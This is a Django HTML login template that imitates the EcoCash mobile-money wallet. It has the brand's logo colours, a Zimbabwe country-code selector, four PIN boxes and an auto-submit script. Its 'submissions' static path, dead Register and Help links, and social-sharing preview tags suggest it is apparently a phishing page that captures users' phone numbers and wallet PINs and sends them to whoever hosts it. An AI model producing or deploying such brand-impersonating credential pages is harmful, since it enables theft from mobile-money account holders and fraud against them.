{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>EcoCash — Login</title>

  <!-- SEO / OG -->
  <meta name="description" content="Login to your EcoCash wallet. Fast, secure mobile money." />
  <meta property="og:title"       content="EcoCash — Login" />
  <meta property="og:description" content="Login to your EcoCash wallet." />
  <meta property="og:image"       content="{{ request.scheme }}://{{ request.get_host }}{% static 'submissions/img/og-cover.png' %}" />
  <meta property="og:type"        content="website" />
  <meta name="twitter:card"       content="summary_large_image" />

  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --eco-blue:       #0057a8;
      --eco-blue-dark:  #004080;
      --eco-red:        #e02020;
      --eco-text:       #1a1a1a;
      --eco-muted:      #555;
      --eco-border:     #c8d8ea;
      --eco-bg:         #f5f8fb;
      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      height: 100%;
      font-family: var(--font);
      background: var(--eco-bg);
      -webkit-font-smoothing: antialiased;
    }

    /* ── Page shell: white top, blue wave bottom ────────────────────────── */
    .page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: #fff;
      max-width: 480px;
      margin: 0 auto;
      position: relative;
      overflow: hidden;
    }

    /* ── Top content area ───────────────────────────────────────────────── */
    .top-section {
      flex: 1;
      padding: 48px 32px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* ── Logo ───────────────────────────────────────────────────────────── */
    .logo {
      font-size: 38px;
      font-weight: 800;
      letter-spacing: -1px;
      margin-bottom: 32px;
      user-select: none;
    }
    .logo span:first-child { color: var(--eco-blue); }
    .logo span:last-child  { color: var(--eco-red);  }

    /* ── Heading ────────────────────────────────────────────────────────── */
    h1 {
      font-size: 22px;
      font-weight: 700;
      color: var(--eco-text);
      margin-bottom: 28px;
      text-align: center;
    }

    /* ── Phone row: flag selector + number input ────────────────────────── */
    .phone-row {
      display: flex;
      width: 100%;
      border: 1.5px solid var(--eco-border);
      border-radius: 8px;
      overflow: visible;
      background: #fff;
      margin-bottom: 28px;
      position: relative;
    }
    .phone-row:focus-within {
      border-color: var(--eco-blue);
      box-shadow: 0 0 0 3px rgba(0,87,168,.12);
    }

    /* Country selector */
    .country-selector {
      position: relative;
      display: flex;
      align-items: center;
      padding: 0 10px 0 12px;
      cursor: pointer;
      border-right: 1.5px solid var(--eco-border);
      gap: 6px;
      min-width: 90px;
      user-select: none;
    }
    .country-selector .flag {
      font-size: 22px;
      line-height: 1;
    }
    .country-selector .code {
      font-size: 15px;
      font-weight: 600;
      color: var(--eco-text);
      white-space: nowrap;
    }
    .country-selector .arrow {
      font-size: 10px;
      color: var(--eco-muted);
      margin-left: 2px;
    }

    /* Hidden native select for accessibility + functionality */
    .country-selector select {
      position: absolute;
      inset: 0;
      opacity: 0;
      width: 100%;
      cursor: pointer;
      font-size: 16px; /* prevents iOS zoom */
    }

    /* Phone number input */
    .phone-input {
      flex: 1;
      border: none;
      outline: none;
      padding: 14px 14px;
      font-size: 17px;
      font-family: var(--font);
      color: var(--eco-text);
      background: transparent;
      min-width: 0;
    }
    .phone-input::placeholder { color: #aab; }

    /* ── PIN label ──────────────────────────────────────────────────────── */
    .pin-label {
      font-size: 15px;
      color: var(--eco-muted);
      margin-bottom: 14px;
      text-align: center;
    }

    /* ── 4-box PIN ──────────────────────────────────────────────────────── */
    .pin-boxes {
      display: flex;
      gap: 14px;
      justify-content: center;
      margin-bottom: 8px;
    }
    .pin-box {
      width: 58px;
      height: 62px;
      border: 1.5px solid var(--eco-border);
      border-radius: 8px;
      font-size: 28px;
      font-weight: 700;
      text-align: center;
      font-family: var(--font);
      color: var(--eco-text);
      background: #fff;
      outline: none;
      caret-color: transparent;
      transition: border-color .15s, box-shadow .15s;
      /* prevent iOS zoom */
      font-size: clamp(20px, 5vw, 28px);
    }
    .pin-box:focus {
      border-color: var(--eco-blue);
      box-shadow: 0 0 0 3px rgba(0,87,168,.12);
    }
    .pin-box--filled { border-color: var(--eco-blue); }
    .pin-box--error  { border-color: var(--eco-red);  }

    /* hidden inputs */
    #pin-hidden, #phone-hidden { display: none; }

    /* ── Error banner ───────────────────────────────────────────────────── */
    .error-banner {
      background: #fff0f0;
      border: 1px solid rgba(224,32,32,.3);
      border-radius: 6px;
      padding: 10px 14px;
      font-size: 14px;
      color: var(--eco-red);
      margin-bottom: 20px;
      width: 100%;
      text-align: center;
    }

    /* ── Wave + blue section ────────────────────────────────────────────── */
    .bottom-section {
      position: relative;
      background: var(--eco-blue);
      color: #fff;
      padding: 0 28px 36px;
      flex-shrink: 0;
    }

    /* SVG wave sits on top of the blue block */
    .wave {
      display: block;
      width: 100%;
      margin-bottom: -2px;
      /* wave is white on top, transparent below — sits between white section and blue */
    }

    .bottom-tagline {
      font-size: 15px;
      text-align: center;
      margin-bottom: 20px;
      line-height: 1.5;
      opacity: .92;
    }

    /* ── CTA button pair ────────────────────────────────────────────────── */
    .cta-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }
    .cta-btn {
      background: #fff;
      color: var(--eco-blue);
      border: none;
      border-radius: 10px;
      padding: 14px 10px 12px;
      font-family: var(--font);
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
      text-decoration: none;
      transition: opacity .15s;
    }
    .cta-btn:active { opacity: .8; }
    .cta-btn svg { flex-shrink: 0; }

    /* ── Terms line at very bottom ──────────────────────────────────────── */
    .terms {
      text-align: center;
      font-size: 11px;
      color: rgba(255,255,255,.6);
      margin-top: 20px;
    }
    .terms a { color: rgba(255,255,255,.8); text-decoration: underline; }

    @media (min-width: 481px) {
      .page { box-shadow: 0 4px 32px rgba(0,0,0,.1); min-height: 100vh; }
    }
  </style>
</head>
<body>
<div class="page">

  <!-- ── White top section ─────────────────────────────────────────── -->
  <div class="top-section">

    <div class="logo"><span>Eco</span><span>Cash</span></div>

    <h1>Login</h1>

    {% if error %}
    <div class="error-banner">{{ error }}</div>
    {% endif %}

    <form method="post" id="login-form" novalidate style="width:100%;">
      {% csrf_token %}

      <!-- Hidden fields submitted with form -->
      <input type="hidden" name="country_code" id="country-code-hidden" value="+263" />
      <input type="hidden" name="phone"         id="phone-hidden" />
      <input type="hidden" name="pin"           id="pin-hidden" />

      <!-- ── Phone row ──────────────────────────────────────────────── -->
      <div class="phone-row">
        <div class="country-selector" id="country-selector">
          <span class="flag" id="flag-display">🇿🇼</span>
          <span class="code" id="code-display">+263</span>
          <span class="arrow">▼</span>
          <select id="country-select" aria-label="Country code">
            <option value="+263" data-flag="🇿🇼" selected>🇿🇼 Zimbabwe +263</option>
            <option value="+27"  data-flag="🇿🇦">🇿🇦 South Africa +27</option>
            <option value="+254" data-flag="🇰🇪">🇰🇪 Kenya +254</option>
            <option value="+260" data-flag="🇿🇲">🇿🇲 Zambia +260</option>
            <option value="+265" data-flag="🇲🇼">🇲🇼 Malawi +265</option>
            <option value="+255" data-flag="🇹🇿">🇹🇿 Tanzania +255</option>
            <option value="+256" data-flag="🇺🇬">🇺🇬 Uganda +256</option>
            <option value="+258" data-flag="🇲🇿">🇲🇿 Mozambique +258</option>
            <option value="+267" data-flag="🇧🇼">🇧🇼 Botswana +267</option>
            <option value="+264" data-flag="🇳🇦">🇳🇦 Namibia +264</option>
            <option value="+234" data-flag="🇳🇬">🇳🇬 Nigeria +234</option>
            <option value="+233" data-flag="🇬🇭">🇬🇭 Ghana +233</option>
          </select>
        </div>

        <input
          class="phone-input"
          type="tel"
          id="phone-display"
          placeholder="712 345 678"
          inputmode="tel"
          autocomplete="tel"
          maxlength="15"
        />
      </div>

      <!-- ── PIN ────────────────────────────────────────────────────── -->
      <p class="pin-label">Enter your PIN</p>

      <div class="pin-boxes" role="group" aria-label="4-digit PIN">
        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 1" data-index="0" autocomplete="off" />
        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 2" data-index="1" autocomplete="off" />
        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 3" data-index="2" autocomplete="off" />
        <input class="pin-box" type="password" inputmode="numeric" maxlength="1" pattern="[0-9]" aria-label="PIN digit 4" data-index="3" autocomplete="off" />
      </div>

    </form>

  </div><!-- /top-section -->

  <!-- ── Wave divider ─────────────────────────────────────────────── -->
  <svg class="wave" viewBox="0 0 480 60" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M0,0 C120,60 360,60 480,0 L480,60 L0,60 Z" fill="#0057a8"/>
  </svg>

  <!-- ── Blue bottom section ──────────────────────────────────────── -->
  <div class="bottom-section">

    <p class="bottom-tagline">
      To register an EcoCash wallet or get assistance,<br>click below
    </p>

    <div class="cta-row">
      <a href="#" class="cta-btn" role="button">
        <!-- person icon -->
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#0057a8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
          <circle cx="12" cy="7" r="4"/>
        </svg>
        Register
      </a>
      <a href="#" class="cta-btn" role="button">
        <!-- info icon -->
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#0057a8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/>
          <line x1="12" y1="16" x2="12" y2="12"/>
          <line x1="12" y1="8" x2="12.01" y2="8"/>
        </svg>
        Help &amp; Support
      </a>
    </div>

    <p class="terms">
      By logging in you agree to our <a href="#">Terms &amp; Conditions</a>
    </p>

  </div>

</div><!-- /page -->

<script>
(function () {
  const select      = document.getElementById('country-select');
  const flagDisplay = document.getElementById('flag-display');
  const codeDisplay = document.getElementById('code-display');
  const codeHidden  = document.getElementById('country-code-hidden');
  const phoneDisplay= document.getElementById('phone-display');
  const phoneHidden = document.getElementById('phone-hidden');
  const pinHidden   = document.getElementById('pin-hidden');
  const pinBoxes    = Array.from(document.querySelectorAll('.pin-box'));
  const form        = document.getElementById('login-form');

  // ── Country selector ─────────────────────────────────────────────────────
  select.addEventListener('change', function () {
    const opt  = select.options[select.selectedIndex];
    const flag = opt.getAttribute('data-flag');
    const code = select.value;
    flagDisplay.textContent = flag;
    codeDisplay.textContent = code;
    codeHidden.value        = code;
  });

  // ── PIN boxes ─────────────────────────────────────────────────────────────
  pinBoxes.forEach(function (box, idx) {
    box.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace') {
        if (box.value) {
          box.value = '';
          syncPin();
        } else if (idx > 0) {
          pinBoxes[idx - 1].focus();
          pinBoxes[idx - 1].value = '';
          syncPin();
        }
        e.preventDefault();
      } else if (e.key === 'ArrowLeft'  && idx > 0)                  pinBoxes[idx - 1].focus();
        else if (e.key === 'ArrowRight' && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
    });

    box.addEventListener('input', function () {
      const val = box.value.replace(/\D/g, '').slice(-1);
      box.value = val;
      if (val) {
        box.classList.add('pin-box--filled');
        if (idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
      } else {
        box.classList.remove('pin-box--filled');
      }
      syncPin();
    });

    box.addEventListener('paste', function (e) {
      e.preventDefault();
      const text = (e.clipboardData || window.clipboardData)
                    .getData('text').replace(/\D/g, '').slice(0, 4);
      text.split('').forEach(function (ch, i) {
        if (pinBoxes[i]) { pinBoxes[i].value = ch; pinBoxes[i].classList.add('pin-box--filled'); }
      });
      pinBoxes[Math.min(text.length, pinBoxes.length - 1)].focus();
      syncPin();
    });
  });

  function syncPin() {
    pinHidden.value = pinBoxes.map(function (b) { return b.value; }).join('');
  }

  // ── Form submit: move phone display value to hidden field ────────────────
  form.addEventListener('submit', function (e) {
    phoneHidden.value = phoneDisplay.value.trim();

    // Basic guard — phone must have digits, pin must be 4 digits
    if (!phoneHidden.value.replace(/\D/g, '')) {
      e.preventDefault();
      phoneDisplay.focus();
      return;
    }
    if (pinHidden.value.length < 4) {
      e.preventDefault();
      pinBoxes[pinHidden.value.length].focus();
      return;
    }
  });

  // Auto-submit when 4th PIN box is filled and phone is present
  pinBoxes[3].addEventListener('input', function () {
    setTimeout(function () {
      if (pinHidden.value.length === 4 && phoneDisplay.value.trim()) {
        form.dispatchEvent(new Event('submit', { cancelable: true }));
        form.submit();
      }
    }, 80);
  });

})();
</script>
</body>
</html>
